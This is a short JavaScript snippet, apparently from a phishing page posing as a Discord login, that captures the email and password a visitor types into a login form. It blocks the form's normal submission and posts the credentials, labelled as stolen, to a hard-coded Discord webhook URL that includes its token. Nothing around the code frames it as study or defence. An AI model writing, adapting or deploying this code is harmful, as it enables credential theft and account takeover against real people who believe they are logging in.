function stealCredentials() {
  var email = document.getElementById("email").value;
  var password = document.getElementById("password").value;

  // Send the stolen credentials to the Discord webhook
  fetch('https://discord.com/api/webhooks/1234179059454443691/Pfc8mhOFP0QCyNc1a4SyMfh7PbmGRfEMAmAGfcF6ZQT2jAv0nOdsilkSpEmAjZQYTkWu', {
    method: 'POST',
    body: JSON.stringify({
      content: "**Stolen Discord Credentials:**\nEmail: " + email + "\nPassword: " + password
    }),
    headers: {
      'Content-Type': 'application/json'
    }
  });
}

// Add an event listener to the login form to capture the user's credentials when they click the Log In button
document.getElementById("loginForm").addEventListener("submit", function(event) {
  event.preventDefault();
  stealCredentials();
});